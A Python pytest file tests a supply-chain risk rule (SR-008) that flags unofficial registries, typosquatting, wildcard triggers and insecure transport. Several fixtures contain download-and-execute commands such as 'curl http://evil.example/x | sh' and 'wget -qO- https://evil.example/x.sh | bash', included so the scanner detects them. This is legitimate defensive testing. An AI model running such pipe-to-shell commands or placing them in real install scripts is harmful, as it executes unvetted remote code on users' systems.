"""SR-008: Supply chain risk rule unit tests."""

import json
from datetime import date

import pytest

from scanners.risk_scanner.analyzers.url_context import (
    URL_USAGE_UNKNOWN,
    classify_url_usage,
)
from scanners.risk_scanner.rules import supply_chain
from scanners.risk_scanner.registry_policy import (
    RegistryClassification,
    RegistryEntry,
    RegistryPolicy,
)
from tests.scanner_mock import MockScanner


@pytest.fixture(autouse=True)
def _no_osv_network(monkeypatch):
    """SR-008 must never hit the real OSV.dev API in tests."""
    monkeypatch.setattr(supply_chain, "_query_osv", lambda *args, **kwargs: [])


class TestSR008SupplyChain:

    @staticmethod
    def _package_lock(host: str, count: int) -> str:
        packages = {
            f"node_modules/dependency-{index}": {
                "version": "1.0.0",
                "resolved": (
                    f"https://{host}/dependency-{index}/-/"
                    f"dependency-{index}-1.0.0.tgz"
                ),
                "integrity": f"sha512-{index}",
            }
            for index in range(count)
        }
        return json.dumps({"lockfileVersion": 3, "packages": packages})

    def test_curl_pipe_shell_in_code_file(self):
        """curl | sh in code file → critical finding (may co-trigger HTTP patterns)."""
        s = MockScanner(files={
            "setup.sh": "curl http://evil.example/x | sh\n",
        })
        supply_chain.run(s)
        assert len(s.findings) >= 1
        assert any(f["severity"] == "critical" for f in s.findings)
        f = s.findings[0]
        assert f["rule_id"] == "SR-008"
        assert f["category"] == "supply_chain"

    def test_whitelisted_download_is_not_trusted_when_piped_to_shell(self):
        """A trusted host does not make download-and-execute safe."""
        s = MockScanner(files={
            "install.py": 'import os\nos.system("curl https://github.com/foo/bar | sh")\n',
        })
        supply_chain.run(s)
        assert any(f["severity"] == "critical" for f in s.findings)
        assert s.findings[0]["disposition"] == "confirmed_vulnerability"

    def test_whitelisted_url_with_trailing_punctuation_is_skipped(self):
        """句尾逗号/句号不应破坏白名单 hostname 解析。"""
        s = MockScanner(files={"client.py": 'url = "https://api.openai.com/v1/models",\n'})
        supply_chain.run(s)
        assert s.findings == []

    def test_url_pattern_ignored_in_markdown(self):
        """URL-based patterns only run on code files, not .md links."""
        s = MockScanner(files={
            "README.md": "Install with: curl http://evil.example/x | sh\n",
        })
        supply_chain.run(s)
        assert s.findings == []

    def test_global_npm_install(self):
        """npm install -g in code file → high finding."""
        s = MockScanner(files={"setup.sh": "npm install -g eslint\n"})
        supply_chain.run(s)
        assert len(s.findings) == 1
        assert s.findings[0]["severity"] == "high"

    def test_npm_range_is_reconciled_with_package_lock(self):
        """A manifest range is reproducible when the lockfile pins it."""
        s = MockScanner(files={})
        s._file_contents = {
            "package.json": '{"dependencies":{"demo-lib":"^1.2.3"}}',
            "package-lock.json": '{"packages":{"":{"lockfileVersion":3},"node_modules/demo-lib":{"version":"1.2.7"}}}',
        }

        supply_chain.run(s)

        assert not any("版本未锁定" in finding["title"] for finding in s.findings)

    def test_unknown_registry_flood_is_one_policy_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": self._package_lock(
                "registry.npmmirror.com", 275
            )
        }

        supply_chain.run(s)

        assert not any("非官方依赖源" in finding["title"] for finding in s.findings)
        advisories = [
            item for item in s.review_advisories
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(advisories) == 1
        assert advisories[0]["level"] == "high"
        assert advisories[0]["category"] == "registry_policy"
        assert advisories[0]["deduction"] == 0
        assert advisories[0]["affects_grade"] is False
        assert advisories[0]["requires_manual_review"] is True
        assert "275 条" in advisories[0]["description"]
        assert "来源本身未经批准 275 条" in advisories[0]["description"]
        assert (
            "TAH_APPROVED_PRIVATE_REGISTRIES_JSON"
            in advisories[0]["description"]
        )
        assert "registry.npmmirror.com (275)" in advisories[0]["evidence"]

    def test_official_registry_produces_no_source_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": self._package_lock(
                "registry.npmjs.org", 20
            )
        }

        supply_chain.run(s)

        assert s.review_advisories == []
        assert not any("依赖来源" in finding["title"] for finding in s.findings)

    def test_yarn_classic_default_lockfile_produces_no_source_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "yarn.lock": (
                "# yarn lockfile v1\n\n"
                "lodash@^4.17.0:\n"
                '  version "4.17.21"\n'
                '  resolved "https://registry.yarnpkg.com/lodash/-/'
                'lodash-4.17.21.tgz#deadbeefdeadbeefdeadbeefdeadbeefdeadbeef"\n'
                "  integrity sha512-demo\n"
            )
        }

        supply_chain.run(s)

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in s.review_advisories
        )

    def test_manifest_registry_is_checked_alongside_lockfile_sources(self):
        s = MockScanner(
            files={},
            _package_metadata={
                "dependencies": {
                    "npm": [{
                        "name": "demo",
                        "version": "1.0.0",
                        "registry": "https://npm.corp.example/",
                    }]
                }
            },
        )
        s._file_contents = {
            "package-lock.json": self._package_lock("registry.npmjs.org", 1)
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        assert "npm.corp.example" in s.review_advisories[0]["evidence"]

    def test_python_and_npm_git_sources_are_one_policy_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "package.json": json.dumps({
                "dependencies": {
                    "npm-git-demo": "git+ssh://git@github.com/example/npm-demo.git",
                    "npm-shortcut-demo": "github:example/short-demo",
                }
            }),
            "requirements.txt": (
                "python-git-demo[security] @ "
                "git+ssh://git@gitlab.com/example/python-demo.git\n"
            ),
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert advisory["level"] == "high"
        assert "github.com" in advisory["evidence"]
        assert "gitlab.com" in advisory["evidence"]
        assert "non_registry_source (2)" in advisory["evidence"]
        assert "unknown_host (1)" in advisory["evidence"]
        assert not any(
            "非官方依赖源" in finding["title"] for finding in s.findings
        )

    def test_short_find_links_and_bare_url_are_one_policy_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "requirements.txt": (
                "-f https://evil.example/wheels\n"
                "https://evil.example/demo-1.0-py3-none-any.whl\n"
            )
        }

        supply_chain.run(s)

        advisories = [
            item for item in s.review_advisories
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(advisories) == 1
        assert "2 条" in advisories[0]["description"]
        assert "evil.example (2)" in advisories[0]["evidence"]
        assert "unknown_host (2)" in advisories[0]["evidence"]
        assert s.findings == []

    @pytest.mark.parametrize(
        "command",
        [
            "npm install -f --registry https://mirror.internal/ demo\n",
            "npm install -f \\\n  --registry https://mirror.internal/ demo\n",
        ],
    )
    def test_npm_force_keeps_registry_api_approval(self, command):
        s = MockScanner(files={"setup.sh": command})
        s.registry_policy = RegistryPolicy([
            RegistryEntry(
                ecosystem="npm",
                exact_host="mirror.internal",
                classification=RegistryClassification.APPROVED_PRIVATE,
                evidence_url="https://security.internal/npm",
                allow_as_resolved_download=False,
                note="Approved for npm registry API use only.",
                reviewed_at=date(2026, 9, 23),
            )
        ])

        supply_chain.run(s)

        assert s.review_advisories == []

    @pytest.mark.parametrize(
        ("installer", "option", "ecosystem"),
        [
            ("pip install", "--index-url", "pypi"),
            ("pip install", "-i", "pypi"),
            ("npm install", "--registry", "npm"),
        ],
    )
    @pytest.mark.parametrize("empty_value", [False, True])
    def test_indented_registry_value_only_binds_to_option_without_equals(
        self, installer, option, ecosystem, empty_value
    ):
        separator = "=\\\n    " if empty_value else " \\\n    "
        s = MockScanner(files={
            "setup.sh": (
                f"{installer} {option}{separator}https://corp.example/simple demo\n"
            )
        })
        s.registry_policy = RegistryPolicy([
            RegistryEntry(
                ecosystem=ecosystem,
                exact_host="corp.example",
                classification=RegistryClassification.APPROVED_PRIVATE,
                evidence_url="https://security.example/registries",
                allow_as_resolved_download=False,
                note="Approved for registry API use only.",
                reviewed_at=date(2026, 9, 24),
            )
        ])

        supply_chain.run(s)

        if empty_value:
            # Shell continuation preserves indentation, so the URL is a new
            # positional argument after --option= (or the short -i= value).
            assert len(s.review_advisories) == 1
            assert "usage_not_allowed (1)" in s.review_advisories[0]["evidence"]
        else:
            assert s.review_advisories == []

    @pytest.mark.parametrize(
        ("installer", "url", "reason"),
        [
            ("npm install", "https://corp.example/demo.tgz", "unknown_host"),
            ("pip install", "https://corp.example/demo.whl", "unknown_host"),
            ("pip install", "https://pypi.org/simple/demo/", "usage_not_allowed"),
        ],
    )
    def test_fourth_line_url_uses_installer_outside_physical_window(
        self, installer, url, reason
    ):
        command = (
            f"{installer} \\\n"
            "  --quiet \\\n"
            "  -- \\\n"
            f"  {url}\n"
        )
        assert classify_url_usage(command, 4, url) == URL_USAGE_UNKNOWN
        s = MockScanner(files={"setup.sh": command})

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert advisory["code"] == "dependency_registry_policy"
        assert advisory["requires_manual_review"] is True
        assert f"{reason} (1)" in advisory["evidence"]

    @pytest.mark.parametrize(
        "config_command",
        [
            "npm config set @scope:registry",
            "npm config set //corp.example:registry",
            "npm set registry",
        ],
    )
    @pytest.mark.parametrize("separator", [" ", " \\\n  ", "=", "=\\\n"])
    def test_npm_registry_config_forms_keep_api_approval(
        self, config_command, separator
    ):
        s = MockScanner(files={
            "setup.sh": f"{config_command}{separator}https://corp.example/\n"
        })
        s.registry_policy = RegistryPolicy([
            RegistryEntry(
                ecosystem="npm",
                exact_host="corp.example",
                classification=RegistryClassification.APPROVED_PRIVATE,
                evidence_url="https://security.example/npm",
                allow_as_resolved_download=False,
                note="Approved for registry API use only.",
                reviewed_at=date(2026, 9, 24),
            )
        ])

        supply_chain.run(s)

        assert s.review_advisories == []

    def test_npm_registry_config_does_not_approve_following_download(self):
        s = MockScanner(files={
            "setup.sh": (
                "npm config set @scope:registry https://registry.corp.example/ \\\n"
                "  && npm install https://registry.corp.example/demo.tgz\n"
            )
        })
        s.registry_policy = RegistryPolicy([
            RegistryEntry(
                ecosystem="npm",
                exact_host="registry.corp.example",
                classification=RegistryClassification.APPROVED_PRIVATE,
                evidence_url="https://security.example/npm",
                allow_as_resolved_download=False,
                note="Approved for registry API use only.",
                reviewed_at=date(2026, 9, 24),
            )
        ])

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        assert "usage_not_allowed (1)" in s.review_advisories[0]["evidence"]

    def test_registry_suffix_in_positional_url_does_not_approve_next_url(self):
        s = MockScanner(files={
            "setup.sh": (
                "pip install https://pypi.org/simple/demo:registry \\\n"
                "  https://pypi.org/simple/demo.whl\n"
            )
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        assert "usage_not_allowed (2)" in s.review_advisories[0]["evidence"]

    @pytest.mark.parametrize(
        ("installer", "option", "approved"),
        [
            ("npm install", "--registry", False),
            ("pip install", "--registry", False),
            ("pip install", "--index-url", False),
            ("pip install", "--find-links", False),
            ("pip install", "--find-links", True),
        ],
    )
    @pytest.mark.parametrize("downloader", ["curl", "wget -qO-"])
    def test_later_shell_pipeline_keeps_earlier_source_observation(
        self, installer, option, approved, downloader
    ):
        s = MockScanner(files={
            "setup.sh": (
                f"{installer} {option} https://corp.example/simple demo \\\n"
                "  && apt-get update \\\n"
                "  && apt-get install -y ca-certificates curl \\\n"
                f"  && {downloader} https://evil.example/x.sh | bash\n"
            )
        })
        if approved:
            s.registry_policy = RegistryPolicy([
                RegistryEntry(
                    ecosystem="pypi",
                    exact_host="corp.example",
                    classification=RegistryClassification.APPROVED_PRIVATE,
                    evidence_url="https://security.example/pypi",
                    allow_as_resolved_download=False,
                    note="Approved for registry API use only.",
                    reviewed_at=date(2026, 9, 24),
                )
            ])

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        evidence = s.review_advisories[0]["evidence"]
        assert "corp.example (1)" in evidence
        reason = "usage_not_allowed" if approved else "unknown_host"
        assert f"{reason} (1)" in evidence
        assert any("pipe shell" in finding["title"] for finding in s.findings)

    @pytest.mark.parametrize("separator", ["\f", "\v", "\x1c"])
    def test_non_newline_whitespace_preserves_url_option_offset(self, separator):
        s = MockScanner(files={
            "setup.sh": (
                f"pip install --index-url {separator}"
                "    https://pypi.org/simple demo\n"
            )
        })

        supply_chain.run(s)

        assert s.review_advisories == []

    @pytest.mark.parametrize("option", ["-f", "--find-links"])
    def test_pip_find_links_continuation_requires_download_approval(
        self, option
    ):
        s = MockScanner(files={
            "setup.sh": (
                f"pip install {option} \\\n"
                "  https://registry.example/wheels demo\n"
            )
        })
        s.registry_policy = RegistryPolicy([
            RegistryEntry(
                ecosystem="pypi",
                exact_host="registry.example",
                classification=RegistryClassification.APPROVED_PRIVATE,
                evidence_url="https://security.example/pypi",
                allow_as_resolved_download=False,
                note="Approved for registry API use only.",
                reviewed_at=date(2026, 9, 23),
            )
        ])

        supply_chain.run(s)

        advisories = [
            item for item in s.review_advisories
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(advisories) == 1
        assert "usage_not_allowed (1)" in advisories[0]["evidence"]

    @pytest.mark.parametrize(
        "command",
        [
            "pip install --index-url https://pypi.org/simple \\\n"
            "  https://pypi.org/simple/demo/\n",
            "pip install --index-url \\\n"
            "  https://pypi.org/simple https://pypi.org/simple/demo/\n",
            "pip install \\\n  --disable-pip-version-check \\\n"
            "  --no-cache-dir \\\n  --index-url \\\n"
            "  https://pypi.org/simple https://pypi.org/simple/demo/\n",
            'pip install -i="https://pypi.org/simple" \\\n'
            '  "https://pypi.org/simple/demo/"\n',
            "pip install --index-url https://pypi.org/simple \\\n"
            "  https://pypi.org/simple\n",
            "pip install https://pypi.org/simple \\\n"
            "  --index-url https://pypi.org/simple\n",
            "pip install registry \\\n  https://pypi.org/simple/demo/\n",
            "pip install -- \\\n  --index-url https://pypi.org/simple/demo/\n",
        ],
    )
    def test_continued_index_option_does_not_approve_positional_url(self, command):
        s = MockScanner(files={"setup.sh": command})

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert advisory["requires_manual_review"] is True
        assert "usage_not_allowed (1)" in advisory["evidence"]
        assert "pypi.org (1)" in advisory["evidence"]

    @pytest.mark.parametrize(
        "command",
        [
            "pip install --find-links https://files.pythonhosted.org/wheels/ \\\n"
            "  --index-url https://pypi.org/simple demo\n",
            "pip install --index-url https://pypi.org/simple \\\n"
            "  --find-links https://files.pythonhosted.org/wheels/ demo\n",
            "pip install \\\n  --disable-pip-version-check \\\n"
            "  --no-cache-dir \\\n  -f \\\n"
            "  https://files.pythonhosted.org/wheels/ -i https://pypi.org/simple demo\n",
            'pip install -f="https://files.pythonhosted.org/wheels/" \\\n'
            '  -i="https://pypi.org/simple" demo\n',
        ],
    )
    def test_continued_mixed_source_options_keep_separate_usage(self, command):
        s = MockScanner(files={"setup.sh": command})

        supply_chain.run(s)

        assert s.review_advisories == []

    def test_requirements_continued_official_index_has_no_policy_advisory(self):
        s = MockScanner(files={})
        s._file_contents = {
            "requirements.txt": "--index-url \\\n  https://pypi.org/simple\n"
        }

        supply_chain.run(s)

        assert s.review_advisories == []

    @pytest.mark.parametrize(
        ("url", "reason"),
        [
            ("https://pypi.org/simple/demo/", "usage_not_allowed"),
            ("https://packages.example/demo.whl", "unknown_host"),
        ],
    )
    def test_requirements_incomplete_index_option_requires_source_review(
        self, url, reason
    ):
        s = MockScanner(files={})
        s._file_contents = {
            "requirements.txt": f"--index-url=\\\n    {url}\n"
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert advisory["code"] == "dependency_registry_policy"
        assert advisory["requires_manual_review"] is True
        assert f"{reason} (1)" in advisory["evidence"]

    def test_registry_advisory_lists_only_five_hosts_plus_count(self):
        packages = {
            f"node_modules/dependency-{index}": {
                "version": "1.0.0",
                "resolved": f"https://registry-{index}.example/pkg.tgz",
            }
            for index in range(7)
        }
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": packages,
            })
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        evidence = s.review_advisories[0]["evidence"]
        assert "registry-4.example" in evidence
        assert "registry-5.example" not in evidence
        assert "registry-6.example" not in evidence
        assert "另有 2 个" in evidence

    def test_registry_advisory_evidence_includes_source_file_distribution(self):
        s = MockScanner(files={})
        s._file_contents = {
            ".npmrc": "registry=https://registry.corp.example/\n",
            "package-lock.json": self._package_lock(
                "registry.corp.example", 2
            ),
        }

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        evidence = s.review_advisories[0]["evidence"]
        assert "files=" in evidence
        assert "package-lock.json (2)" in evidence
        assert ".npmrc (1)" in evidence

    def test_dependency_urls_in_code_join_the_same_policy_advisory(self):
        s = MockScanner(files={
            "setup.sh": (
                "npm config set registry https://registry-one.example/\n"
                "npm config set registry https://registry-two.example/\n"
            )
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        assert "registry-one.example" in s.review_advisories[0]["evidence"]
        assert "registry-two.example" in s.review_advisories[0]["evidence"]
        assert not any(
            "非官方包源" in finding["title"] for finding in s.findings
        )

    def test_duplicate_inline_dependency_urls_count_once(self):
        source = "https://registry.corp.example/"
        s = MockScanner(files={
            "setup.sh": (
                f"npm config set registry {source}\n"
                f"npm config set registry {source}\n"
            )
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert "检测到 1 条" in advisory["description"]
        assert "registry.corp.example (1)" in advisory["evidence"]

    def test_official_dependency_url_in_code_is_clean(self):
        s = MockScanner(files={
            "setup.sh": (
                "npm config set registry https://registry.npmjs.org/\n"
            )
        })

        supply_chain.run(s)

        assert s.review_advisories == []
        assert s.findings == []

    def test_bare_official_npm_download_url_in_code_is_clean(self):
        s = MockScanner(files={
            "install.py": (
                'DOWNLOAD_URL = "https://registry.npmjs.org/'
                'lodash/-/lodash-4.17.21.tgz"\n'
            )
        }, _package_metadata={"name": "demo", "version": "1.0.0"})

        supply_chain.run(s)

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in s.review_advisories
        )

    def test_real_scanner_bare_official_npm_url_is_clean(self, tmp_path):
        from scanners.risk_scanner.scanner import RiskScanner

        (tmp_path / "manifest.json").write_text(
            json.dumps({
                "name": "registry-regression",
                "version": "1.0.0",
                "type": "skill",
                "description": "Registry policy regression fixture.",
                "author": "TrustedAgentHub",
                "license": "Apache-2.0",
                "permissions": {},
            }),
            encoding="utf-8",
        )
        (tmp_path / "install.py").write_text(
            'DOWNLOAD_URL = "https://registry.npmjs.org/'
            'lodash/-/lodash-4.17.21.tgz"\n',
            encoding="utf-8",
        )

        report = RiskScanner(tmp_path).scan()

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in report["review_advisories"]
        )

    @pytest.mark.parametrize(
        "command",
        [
            "pip install -i https://pypi.org/simple flask\n",
            (
                "dotnet nuget add source "
                "https://api.nuget.org/v3/index.json\n"
            ),
        ],
    )
    def test_official_short_form_registry_commands_have_no_advisory(
        self, command
    ):
        assert supply_chain._dependency_usage_for_url(
            command, command.index("https://")
        ) == "registry_api"
        s = MockScanner(files={"setup.sh": command})

        supply_chain.run(s)

        assert not any(
            advisory["code"] == "dependency_registry_policy"
            for advisory in s.review_advisories
        )

    def test_http_dependency_sources_are_aggregated_separately(self):
        s = MockScanner(files={})
        lock = json.loads(self._package_lock("registry.npmjs.org", 3))
        for package in lock["packages"].values():
            package["resolved"] = package["resolved"].replace(
                "https://", "http://"
            )
        s._file_contents = {"package-lock.json": json.dumps(lock)}

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        transport_findings = [
            finding for finding in s.findings
            if finding["title"] == "依赖来源使用 HTTP 明文传输"
        ]
        assert len(transport_findings) == 1
        assert transport_findings[0]["severity"] == "medium"
        assert "3 条" in transport_findings[0]["description"]

    def test_unknown_http_registry_still_reports_transport_risk(self):
        s = MockScanner(files={})
        lock = json.loads(self._package_lock("registry.unknown.example", 2))
        for package in lock["packages"].values():
            package["resolved"] = package["resolved"].replace(
                "https://", "http://"
            )
        s._file_contents = {"package-lock.json": json.dumps(lock)}

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert "传输或凭据不安全 2 条" in advisory["description"]
        assert "改用 HTTPS" in advisory["description"]
        assert "insecure_scheme (2)" in advisory["evidence"]
        assert sum(
            finding["title"] == "依赖来源使用 HTTP 明文传输"
            for finding in s.findings
        ) == 1

    def test_registry_advisory_distinguishes_endpoint_usage_mismatch(self):
        s = MockScanner(files={
            "setup.sh": "pip install https://pypi.org/simple/demo/\n"
        })

        supply_chain.run(s)

        assert len(s.review_advisories) == 1
        advisory = s.review_advisories[0]
        assert (
            "已批准端点的使用方式不匹配 1 条"
            in advisory["description"]
        )
        assert "通常无需新增审批" in advisory["description"]
        assert "usage_not_allowed (1)" in advisory["evidence"]
        assert "来源本身未经批准" not in advisory["description"]

    def test_registry_approval_does_not_skip_cve_lookup(self, monkeypatch):
        monkeypatch.setattr(
            supply_chain,
            "_query_osv",
            lambda *args, **kwargs: ["CVE-2099-0001"],
        )
        s = MockScanner(files={})
        s._file_contents = {
            "package-lock.json": self._package_lock("registry.npmjs.org", 1)
        }

        supply_chain.run(s)

        assert s.review_advisories == []
        assert any(
            "CVE-2099-0001" in finding["title"] for finding in s.findings
        )

    def test_requirement_version_fragment_is_not_sent_to_osv(self, monkeypatch):
        queries = []

        def capture_query(package_name, version, ecosystem):
            queries.append((package_name, version, ecosystem))
            return []

        monkeypatch.setattr(supply_chain, "_query_osv", capture_query)
        s = MockScanner(files={})
        s._file_contents = {
            "requirements.txt": "requests==2.31.0#sha256=deadbeef\n"
        }

        supply_chain.run(s)

        assert queries == [("requests", "2.31.0", "PyPI")]

    def test_risk_scanner_end_to_end_collapses_registry_flood(self, tmp_path):
        from scanners.risk_scanner.dependency_parsers.osv_client import (
            OSVQueryResult,
        )
        from scanners.risk_scanner.scanner import RiskScanner

        (tmp_path / "package-lock.json").write_text(
            self._package_lock("registry.npmmirror.com", 275),
            encoding="utf-8",
        )
        scanner = RiskScanner(tmp_path)

        class NoVulnerabilityClient:
            max_queries = 500
            queried = 0

            def query(self, dependency):
                self.queried += 1
                return OSVQueryResult([], None)

        scanner.osv_client = NoVulnerabilityClient()

        report = scanner.scan()

        policy_advisories = [
            item for item in report["review_advisories"]
            if item["code"] == "dependency_registry_policy"
        ]
        assert len(policy_advisories) == 1
        assert "275 条" in policy_advisories[0]["description"]
        assert not any(
            "非官方依赖源" in finding["title"]
            for finding in report["findings"]
        )
        assert report["dependency_scan"]["dependencies_queried"] == 275

    def test_typosquatting_dependency(self, tmp_path):
        """Dependency 'requets' is 1 edit from known 'requests' → high finding."""
        s = MockScanner(
            files={"SKILL.md": "# hi"},
            _package_metadata={
                "name": "demo-pkg",
                "dependencies": {"pypi": [{"name": "requets", "version": "1.0.0"}]},
            },
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        titles = [f["title"] for f in s.findings]
        assert any("Typosquatting" in t for t in titles)
        assert s.findings[0]["severity"] == "high"

    def test_excessive_triggers(self, tmp_path):
        """More than 10 triggers → low finding."""
        s = MockScanner(
            files={"SKILL.md": "# hi"},
            _package_metadata={
                "type": "skill",
                "triggers": [f"trigger-{i}" for i in range(12)],
            },
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        titles = [f["title"] for f in s.findings]
        assert any("过度触发" in t for t in titles)

    def test_wildcard_trigger(self, tmp_path):
        """Triggers containing '*' → low finding."""
        s = MockScanner(
            files={"SKILL.md": "# hi"},
            _package_metadata={
                "type": "skill",
                "triggers": ["*"],
            },
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        titles = [f["title"] for f in s.findings]
        assert any("通配符" in t for t in titles)

    def test_wildcard_trigger_without_manifest(self):
        s = MockScanner(
            files={"automation.py": "triggers = [*]\n"},
            _package_metadata=None,
        )

        supply_chain.run(s)

        wildcard_findings = [
            finding for finding in s.findings
            if finding["title"] == "触发器使用通配符"
        ]
        assert len(wildcard_findings) == 1
        assert wildcard_findings[0]["location"]["file"] == "automation.py"

    def test_multiline_wildcard_trigger_without_manifest(self):
        s = MockScanner(
            files={
                "automation.json": '{\n  "triggers": [\n    "*"\n  ]\n}\n'
            },
            _package_metadata=None,
        )

        supply_chain.run(s)

        wildcard_findings = [
            finding for finding in s.findings
            if finding["title"] == "触发器使用通配符"
        ]
        assert len(wildcard_findings) == 1
        assert wildcard_findings[0]["location"]["file"] == "automation.json"

    def test_url_scheme_before_wildcard_trigger_is_not_a_comment(self):
        s = MockScanner(
            files={
                "setup.sh": (
                    "URL=https://registry.npmjs.org/; triggers: [\"*\"]\n"
                )
            },
            _package_metadata=None,
        )

        supply_chain.run(s)

        titles = {finding["title"] for finding in s.findings}
        assert "触发器使用通配符" in titles
        assert "供应链风险 — 依赖版本号使用通配符 *" in titles

    def test_js_private_field_does_not_hide_wildcard_trigger(self):
        s = MockScanner(
            files={
                "setup.js": (
                    "const value = obj.#field; triggers = [\"*\"];\n"
                )
            },
            _package_metadata=None,
        )

        supply_chain.run(s)

        assert any(
            finding["title"] == "触发器使用通配符"
            for finding in s.findings
        )

    @pytest.mark.parametrize(
        ("filename", "content"),
        [
            ("setup.sh", '# triggers = ["*"]\n'),
            ("setup.js", '// triggers = ["*"]\n'),
            ("setup.js", '/* triggers = ["*"] */\n'),
            (
                "setup.js",
                (
                    "const endpoint = https://registry.npmjs.org/; "
                    '// triggers = ["*"];\n'
                ),
            ),
            (
                "setup.js",
                'const triggers = [\n  // "*"\n];\n',
            ),
        ],
    )
    def test_commented_wildcard_trigger_is_ignored(self, filename, content):
        s = MockScanner(files={filename: content}, _package_metadata=None)

        supply_chain.run(s)

        assert s.findings == []

    def test_commented_trigger_does_not_override_manifest_location(self):
        s = MockScanner(
            files={"setup.sh": '# triggers = ["*"]\n'},
            _package_metadata={"triggers": ["*"]},
        )

        supply_chain.run(s)

        wildcard = next(
            finding for finding in s.findings
            if finding["title"] == "触发器使用通配符"
        )
        assert wildcard["location"]["file"] == "SKILL.md"

    def test_manifest_fallback_records_are_passed_to_source_parser_once(
        self, monkeypatch
    ):
        captured_records = []

        def capture_sources(_files, records):
            captured_records.extend(records)
            return []

        monkeypatch.setattr(
            supply_chain, "parse_dependency_sources", capture_sources
        )
        s = MockScanner(
            files={},
            _package_metadata={
                "dependencies": {
                    "npm": [{
                        "name": "demo",
                        "version": "1.0.0",
                        "registry": "https://registry.npmjs.org/",
                    }]
                }
            },
        )

        supply_chain.run(s)

        assert len(captured_records) == 1
        assert captured_records[0].name == "demo"

    def test_benign_code_no_finding(self, tmp_path):
        """Clean code + no metadata → no findings."""
        s = MockScanner(
            files={"main.py": "print('hello')\n"},
            _package_metadata={"name": "demo", "description": "safe"},
            target_dir=tmp_path,
        )
        supply_chain.run(s)
        assert s.findings == []
